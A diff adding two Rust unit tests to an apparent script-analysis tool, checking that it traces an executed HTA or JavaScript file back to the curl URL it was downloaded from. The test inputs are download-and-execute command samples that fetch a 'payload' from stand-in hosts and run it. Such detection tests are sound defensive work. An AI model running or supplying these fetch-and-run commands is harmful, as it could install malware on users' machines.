@@ -1276,6 +1276,44 @@ mod echo_tests {
     }
 
     #[test]
+    fn implicit_hta_execution_resolves_prior_download_source_url() {
+        let script = br#"curl -o payload.hta https://implicit-hta-source.example/payload.hta
+start payload.hta"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "payload.hta"
+                            && url == "https://implicit-hta-source.example/payload.hta"
+                )
+            }),
+            "implicit HTA execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn implicit_script_execution_resolves_prior_download_source_url() {
+        let script = br#"curl -o payload.js https://implicit-js-source.example/payload.js
+payload.js"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "payload.js"
+                            && url == "https://implicit-js-source.example/payload.js"
+                )
+            }),
+            "implicit script execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmd_vd_c_mashed_flag_enables_delayed_expansion() {
         // `cmd /V/D/c "..."` is a single token mashing three flags. The
         // flags-section parser used to bail because the token's 2-char
